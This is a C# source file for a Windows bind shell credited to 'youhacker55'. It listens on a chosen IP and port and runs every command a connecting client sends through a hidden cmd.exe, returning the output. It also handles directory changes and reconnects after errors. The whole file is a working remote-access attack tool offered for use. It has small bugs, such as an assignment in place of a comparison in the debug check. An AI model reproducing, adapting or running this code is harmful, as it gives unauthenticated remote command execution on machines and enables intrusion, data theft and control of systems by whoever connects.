using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace bindshell
{
    class Program
    {
        
        public static string ipaddr;
        public static int port;
        public static Socket clientpacket;
        public static bool Debug;
        static void Main(string[] args)
        {
            ExecuteCMD("cls");
            Console.WriteLine(@" .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || |     _____    | || | ____  _____  | || |  ________    | || |              | || |    _______   | || |  ____  ____  | || |  _________   | || |   _____      | || |   _____      | |
| |  |_   _ \    | || |    |_   _|   | || ||_   \|_   _| | || | |_   ___ `.  | || |              | || |   /  ___  |  | || | |_   ||   _| | || | |_   ___  |  | || |  |_   _|     | || |  |_   _|     | |
| |    | |_) |   | || |      | |     | || |  |   \ | |   | || |   | |   `. \ | || |              | || |  |  (__ \_|  | || |   | |__| |   | || |   | |_  \_|  | || |    | |       | || |    | |       | |
| |    |  __'.   | || |      | |     | || |  | |\ \| |   | || |   | |    | | | || |              | || |   '.___`-.   | || |   |  __  |   | || |   |  _|  _   | || |    | |   _   | || |    | |   _   | |
| |   _| |__) |  | || |     _| |_    | || | _| |_\   |_  | || |  _| |___.' / | || |              | || |  |`\____) |  | || |  _| |  | |_  | || |  _| |___/ |  | || |   _| |__/ |  | || |   _| |__/ |  | |
| |  |_______/   | || |    |_____|   | || ||_____|\____| | || | |________.'  | || |   _______    | || |  |_______.'  | || | |____||____| | || | |_________|  | || |  |________|  | || |  |________|  | |
| |              | || |              | || |              | || |              | || |  |_______|   | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
Made By youhacker55
");

            if (args.Length > 1 && args.Length < 4)
            {

                ipaddr = args[0];
                try
                {
                    port = Int32.Parse(args[1]);

                }
                catch (Exception)
                {
                    Console.WriteLine("[-] Port should be a integer");
                    Console.ReadLine();
                    Environment.Exit(0);
                }
                try
                {
                    if (args[2] == "Debug")
                    {
                        Debug = true;
                        Console.WriteLine("[+] Debug Mode On ");

                    }
                    else if (args[2] == "NODebug")
                    {
                        Debug = false;
                        Console.WriteLine("[*] Debug Mode off");
                    }

                }
                catch
                {
                    Console.WriteLine("[*] Specify if you want debug mod or on by Arg Debug,NODebug");
                }





            }
            else
            {
                Console.WriteLine("NO args detected Example How To Use:Bind_shell.exe 0.0.0.0 4444 ");
                // Print Error if server Detected
                Console.WriteLine(args.Length);
      
                Console.ReadLine();
                Environment.Exit(0);
            }

            Socket Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ipaddr), port);
            Server.Bind(ep);
            Server.Listen(100);
            Console.WriteLine("Bind shell started on " + ipaddr + ":" + port);

         
            Socket clientpacket = default(Socket);
            clientpacket = Server.Accept();

            while (true)
            {
                try
                {
                    byte[] buffer = new byte[1024];
                    int DATA = clientpacket.Receive(buffer);
                    char[] chars = new char[DATA];

                    System.Text.Decoder d = System.Text.Encoding.UTF8.GetDecoder();
                    int charLen = d.GetChars(buffer, 0, DATA, chars, 0);
                    System.String recv = new System.String(chars);
                    if (recv == "exit")
                    {
                        break;
                    }
                    else if (recv.Substring(0, 3) == "cd ")
                    {
                        clientpacket.Send(enocde(moveworkingdir(recv.Substring(3))));

                    }
                    else if (recv.Substring(0,2) == "ls")
                    {
                        continue;
                    }
                    else
                    {
                        string output = ExecuteCMD(recv);


                        clientpacket.Send(enocde(output));

                    }

                }
                catch (Exception e)
                {
                    if (Debug = true)
                    {

                        Console.WriteLine("Debug Info "+e);
                    }
                    // restart the server 
                    clientpacket = Server.Accept();
                    
                    continue;
                }




            }
        }
        public static byte[] enocde(string strtoencode)
        {
            byte[] code = ASCIIEncoding.ASCII.GetBytes(strtoencode);
            return code;
        }
        public static string ExecuteCMD(string command)
        {

            try
            {
                string results = "";

                System.Diagnostics.Process pInstance = new System.Diagnostics.Process();
                pInstance.StartInfo.FileName = "cmd.exe";
                pInstance.StartInfo.Arguments = "/c" + command;
                pInstance.StartInfo.UseShellExecute = false;
                pInstance.StartInfo.CreateNoWindow = true;
                pInstance.StartInfo.RedirectStandardOutput = true;
                pInstance.StartInfo.RedirectStandardError = true;
                pInstance.Start();

                results += pInstance.StandardOutput.ReadToEnd();
                results += pInstance.StandardError.ReadToEnd();
                return results;

            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }


        }
        public static string moveworkingdir(string path)
        {
            try
            {
                System.IO.Directory.SetCurrentDirectory(path);
                return "Directory changed To "+path;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }

        }









    }
    


}



